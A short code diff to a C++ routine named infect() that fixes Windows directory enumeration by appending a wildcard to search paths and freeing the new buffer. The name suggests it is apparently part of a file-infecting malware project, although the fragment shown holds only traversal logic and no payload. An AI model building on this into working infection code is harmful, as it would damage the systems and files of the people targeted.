@@ -172,6 +172,7 @@ int infect(void)
    while (search_stack_size > 0)
    {
       char *search_visit = search_stack[--search_stack_size];
+      char starSearch[] = {'\\','*',0};
 
       if (search_stack_size == 0)
       {
@@ -180,14 +181,18 @@ int infect(void)
       }
       else
          search_stack = reinterpret_cast<char **>(realloc(search_stack, sizeof(char *) * search_stack_size));
+
+      char *search_string = reinterpret_cast<char *>(malloc(strlen(search_visit)+strlen(starSearch)+1));
+      memcpy(search_string, search_visit, strlen(search_visit)+1);
+      strncat(search_string, starSearch, strlen(starSearch));
       
       WIN32_FIND_DATAA find_data;
-      HANDLE find_handle = findFirstFile(search_visit, &find_data);
+      HANDLE find_handle = findFirstFile(search_string, &find_data);
 
       if (find_handle == INVALID_HANDLE_VALUE)
          goto free_and_continue;
 
-      std::wcout << "Enumerating " << search_visit << std::endl;
+      std::wcout << "Enumerating " << search_string << std::endl;
       
       do
       {
@@ -197,6 +202,7 @@ int infect(void)
       std::wcout << std::endl;
 
    free_and_continue:
+      free(search_string);
       free(search_visit);
    }
 
